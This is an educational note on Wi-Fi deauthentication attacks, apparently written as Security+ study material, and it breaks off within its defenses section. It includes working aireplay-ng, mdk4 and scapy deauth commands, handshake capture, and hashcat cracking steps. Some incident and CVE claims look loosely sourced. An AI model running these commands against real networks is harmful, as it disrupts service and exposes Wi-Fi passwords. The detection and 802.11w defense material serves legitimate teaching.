---
domain: "wireless security"
tags: [wireless, denial-of-service, 802.11, deauthentication, wifi-attacks, network-security]
---
# Wireless Deauthentication Attacks

A **wireless deauthentication attack** is a [[Denial of Service (DoS)]] technique that exploits the unauthenticated management frame structure of the **IEEE 802.11 Wi-Fi protocol** to forcibly disconnect clients from an access point. The attack abuses **deauthentication frames**, which are legitimate control messages in the 802.11 standard, by spoofing them from either the access point or the client. This makes it a particularly effective attack because it requires no prior association with the network and exploits a fundamental design weakness in older Wi-Fi standards.

---

## Overview

The IEEE 802.11 standard, first ratified in 1997, defined a set of management frame types used to establish and tear down wireless connections. Among these are **deauthentication** and **disassociation** frames, which a legitimate access point (AP) sends to clients to terminate a session—for example, during a reboot or when removing a client from the network. The critical flaw is that in the original 802.11 specification (and in 802.11a/b/g/n implementations without additional protections), these management frames are sent **in plaintext with no cryptographic authentication**. Any station on the channel can forge these frames using a spoofed source MAC address.

An attacker exploiting this vulnerability does not need to know the network's Wi-Fi passphrase, break any encryption, or be an associated member of the network. They only need to be within radio range and able to inject raw 802.11 frames. Because the victim client or AP has no way to verify that the deauthentication frame is genuine, it obediently disconnects. This mechanism was documented extensively by researchers in the early 2000s and has been incorporated into numerous wireless auditing tools since at least 2004 with the release of the Aircrack-ng suite.

Deauthentication attacks serve multiple offensive purposes beyond simple disruption. They are a critical prerequisite for **WPA/WPA2 handshake capture attacks**: by forcing a client off the network, the attacker can capture the four-way [[EAPOL Handshake]] when the client reconnects, which can then be subjected to offline [[Dictionary Attack]] or [[Brute Force Attack]] methods to recover the Pre-Shared Key (PSK). They also facilitate **evil twin** and **captive portal** attacks by disconnecting users from a legitimate AP, leaving them to connect to a malicious access point instead.

Real-world impact includes disruption of hospital wireless infrastructure, interference with wireless industrial control systems, and targeted harassment at public events. The attack has been used in the wild to disrupt retail point-of-sale systems that rely on Wi-Fi connectivity. Security researchers demonstrated deauthentication attacks against aviation communication systems (though under controlled conditions), underscoring that the vulnerability extends beyond consumer networks. The IEEE addressed this fundamental weakness with the **802.11w amendment** (Management Frame Protection, or MFP), finalized in 2009 and mandated in the [[WPA3]] standard ratified in 2018.

The widespread deployment of older WPA2-only hardware and the optional nature of 802.11w in WPA2 networks means that billions of deployed devices remain vulnerable to deauthentication attacks today. Even networks using WPA2 with 802.11w optionally enabled can be vulnerable to downgrade attacks if the AP accepts associations from clients that do not support MFP.

---

## How It Works

### 802.11 Frame Structure Background

The 802.11 protocol organizes wireless communication into three frame types:
- **Management frames** – used for association, authentication, beacons, deauthentication
- **Control frames** – used for RTS/CTS, ACK
- **Data frames** – used for actual payload data

Deauthentication frames are **Type 0, Subtype 12 (0x0C)** management frames. They contain:
- **Destination MAC address** (the client being kicked, or broadcast `FF:FF:FF:FF:FF:FF`)
- **Source MAC address** (spoofed as the AP's BSSID)
- **BSSID** (the AP address)
- **Reason code** (a 2-byte field indicating why the deauthentication is occurring)

Common reason codes used in attacks:
| Code | Meaning |
|------|---------|
| 1 | Unspecified reason |
| 3 | Station is leaving the BSS |
| 7 | Class 3 frame received from nonassociated station |

### Attack Execution: Step by Step

**Step 1: Reconnaissance – Identify Target AP and Client**

The attacker places their wireless adapter into monitor mode to capture all 802.11 traffic passively on a given channel:

```bash
# Put interface into monitor mode
sudo airmon-ng start wlan0

# Capture traffic to identify target AP and associated clients
sudo airodump-ng wlan0mon
```

The output reveals:
- **BSSID** – the MAC address of the access point
- **ESSID** – the network name
- **Channel** – the operating channel
- **STATION** – MAC addresses of connected clients

**Step 2: Lock to Target Channel**

```bash
# Lock monitor interface to the target AP's channel (e.g., channel 6)
sudo airodump-ng --bssid AA:BB:CC:DD:EE:FF --channel 6 wlan0mon
```

**Step 3: Inject Deauthentication Frames**

Using `aireplay-ng` to send deauthentication frames:

```bash
# Syntax: aireplay-ng --deauth <count> -a <AP BSSID> -c <Client MAC> <interface>

# Targeted deauth: disconnect one specific client (100 frames)
sudo aireplay-ng --deauth 100 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon

# Broadcast deauth: disconnect ALL clients from the AP (0 = continuous)
sudo aireplay-ng --deauth 0 -a AA:BB:CC:DD:EE:FF wlan0mon
```

Each frame transmitted spoofs the source MAC as the AP's BSSID. The receiving client, unable to verify authenticity, processes the frame and disconnects.

**Step 4: Capture the WPA2 Handshake (Common Follow-On Attack)**

While sending deauth frames, simultaneously capture traffic:

```bash
sudo airodump-ng --bssid AA:BB:CC:DD:EE:FF --channel 6 -w capture_file wlan0mon
```

When the deauthenticated client reconnects, `airodump-ng` will announce `WPA handshake: AA:BB:CC:DD:EE:FF`. The capture file (`.cap`) can then be used for offline cracking:

```bash
# Crack with a wordlist using aircrack-ng
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt capture_file-01.cap

# Or use hashcat for GPU-accelerated cracking (convert to hashcat format first)
sudo hcxpcapngtool -o handshake.hc22000 capture_file-01.cap
hashcat -m 22000 handshake.hc22000 /usr/share/wordlists/rockyou.txt
```

### Alternative Tools

```bash
# mdk4 – advanced 802.11 frame injection tool
# Deauth attack with mdk4 (a = authentication DoS)
sudo mdk4 wlan0mon d -B AA:BB:CC:DD:EE:FF

# Using scapy for a Python-based custom deauth packet
from scapy.all import *

def deauth(target_mac, gateway_mac, iface="wlan0mon", count=100):
    dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
    frame = RadioTap()/dot11/Dot11Deauth(reason=7)
    sendp(frame, iface=iface, count=count, inter=0.1, verbose=1)

deauth("11:22:33:44:55:66", "AA:BB:CC:DD:EE:FF")
```

### Why It Works Without Credentials

The attack succeeds because the 802.11 standard prior to 802.11w provides **no integrity or authentication mechanism** for management frames. Unlike data frames (which are encrypted under WPA2), management frames are transmitted in the clear. There is no Message Integrity Code (MIC) on deauth frames in legacy 802.11, meaning an attacker with a frame injection-capable adapter can craft and transmit arbitrary management frames indistinguishable from legitimate ones.

---

## Key Concepts

- **Deauthentication Frame**: A **Type 0, Subtype 12 management frame** in 802.11 that instructs a station to terminate its current association. Legitimate uses include AP reboot, administrative ejection of clients, and session cleanup. Attackers forge these frames to perform DoS or facilitate credential capture.

- **Management Frame Protection (MFP / 802.11w)**: An **IEEE 802.11w amendment** that adds cryptographic integrity to unicast and broadcast management frames using a Message Integrity Code (MIC). Requires both the AP and client to negotiate and support MFP; made mandatory in [[WPA3]]. Broadcast deauth frames are protected using the **Broadcast/Multicast Integrity Protocol (BIP)**.

- **Monitor Mode**: A **promiscuous capture mode** for wireless adapters that allows the NIC to receive all 802.11 frames on a channel, including those not addressed to the adapter's MAC address. Required for passive reconnaissance and frame injection. Not all wireless chipsets support this; Alfa AWUS036ACH (Realtek RTL8812AU) and similar adapters are commonly used for research.

- **BSSID Spoofing**: The technique of **forging the MAC address of an access point** in the source address field of an 802.11 frame. Since 802.11 management frames carry no authentication, a client cannot distinguish a spoofed deauth frame from one legitimately sent by its AP.

- **Four-Way Handshake Capture**: A **follow-on attack technique** where an attacker forces a client to reconnect after deauthentication, capturing the [[EAPOL Handshake]] exchange between client and AP. This handshake contains enough information for an offline dictionary or brute-force attack against the WPA2 Pre-Shared Key.

- **PMKID Attack**: A **more recent WPA2 attack method** (discovered by Jens Steube in 2018) that does not require capturing a four-way handshake or even deauthenticating any client. The PMKID can be obtained directly from the AP's EAPOL frame 1, though deauth attacks are still widely used for handshake capture on older or misconfigured networks.

- **Reason Code**: A **2-byte field in deauthentication and disassociation frames** indicating the stated reason for disconnection. While any code can be used in an attack, reason code 3 ("Deauthenticated because sending station is leaving") and reason code 7 are most commonly spoofed.

---

## Exam Relevance

**Security+ SY0-701 Domain Mapping**: This topic falls under **Domain 2.0 – Threats, Vulnerabilities, and Mitigations** and **Domain 4.0 – Security Operations** (specifically wireless security and attack types).

**Common Question Patterns:**

1. **Scenario questions** will describe a user repeatedly losing their Wi-Fi connection or being unable to stay connected, asking you to identify the attack type. The correct answer is **deauthentication attack** (a type of wireless DoS).

2. Questions may ask which protocol or technology **mitigates** deauthentication attacks. The answer is **802.11w / Management Frame Protection (MFP)**. Know that WPA3 mandates 802.11w.

3. Distinguish between **deauthentication** (terminates authentication state, more severe) and **disassociation** (terminates association but authentication state may remain). Both can be spoofed; the terms are sometimes used interchangeably on exams.

4. Questions about **WPA2 password cracking** often tie in deauthentication as the mechanism to force handshake capture. The sequence is: deauth → client reconnects → capture EAPOL handshake → offline crack.

5. Deauth attacks may appear in questions about **evil twin attacks** or **rogue access points** — deauth forces clients off the legitimate AP so they connect to the attacker's malicious AP.

**Gotchas:**

- Do not confuse deauthentication attacks with [[Jamming Attacks]]. Jamming floods the RF spectrum with noise; deauth sends valid-looking protocol frames. Both cause disconnection, but the mechanisms and defenses differ.
- The attack **does not break WPA2 encryption directly** — it only assists in capturing the handshake.
- 802.11w does **not** protect all management frames; probe requests and beacon frames remain unprotected by design.
- Know that WPA3-Personal uses **SAE (Simultaneous Authentication of Equals)** which, combined with 802.11w, significantly raises the bar against both deauth and offline cracking attacks.

---

## Security Implications

### Fundamental Design Vulnerability

The deauthentication attack exploits **CVE-2004-0823** and related issues formalized through the broader IEEE 802.11 management frame vulnerability class. No specific CVE uniquely captures the deauthentication problem because it is a **design flaw in the protocol standard itself**, not an implementation bug. The IEEE acknowledged this in the development of 802.11w.

### Attack Vectors

- **WPA2 Handshake Capture**: As described above, deauth is the most common way to force a handshake capture for offline cracking. Widely used in penetration testing and documented in countless CTF challenges.
- **Evil Twin Facilitation**: Deauth forces clients off a legitimate AP. If the attacker's evil twin AP has a stronger signal or is configured to match the legitimate SSID/BSSID, the victim client may automatically reconnect to the malicious AP. See [[Evil Twin Attack]].
- **Denial of Service**: Continuous broadcast deauth frames (`--deauth 0`) can render an entire wireless network inoperable, impacting business operations, guest networks, or industrial wireless systems.
- **Session Disruption / Business Impact**: Wireless-dependent systems such as VoIP phones (Wi-Fi calling), wireless POS terminals, and warehouse scanning equipment can be disrupted, potentially causing significant operational and financial impact.

### Real-World Incidents

- **2014 – Las Vegas Hotel Networks**: Security researchers at DEF CON demonstrated mass deauthentication of hotel guest networks, illustrating the ease of the attack in high-density environments.
- **2015 – Industrial Control Systems**: Researchers published findings showing deauthentication attacks against wireless industrial sensors operating on 802.11 infrastructure, raising concerns about SCADA/ICS security.
- **2019 – Retail Sector**: Documented cases of competitors using deauth tools to disrupt wireless payment terminals during high-traffic periods (reported by security consultancies, though not always attributed publicly).

### Detection Indicators

- Spike in deauthentication or disassociation frames visible in wireless IDS
- Clients repeatedly disconnecting and reconnecting within seconds
- Reason code 7 appearing frequently (uncommon in legitimate traffic)
- Multiple deauth frames with the same source MAC (AP BSSID) but originating from a different RF location than the legitimate AP
- Wireless IDS alerts for management frame floods

---

## Defensive Measures

### 1. Enable 802.11w (Management Frame Protection)

The primary technical control. Configure all APs to require 802.11w for client associations:

- **Cisco WLC / Catalyst**: Set MFP to **Required** (not just Capable)
- **Ubiquiti UniFi**: Under Wireless Networks → Advanced → Enable 802.11w → Set to **Required**
- **hostapd** (Linux AP):

```ini
# /etc/hostapd/hostapd.conf
ieee80211w=2          # 2 = Required (1 = Optional/Capable)
wpa_key_mgmt=WPA-PSK-SHA256   # Use SHA-256 key management with MFP
```

**Caveat**: Setting MFP to Required will exclude legacy clients (pre-802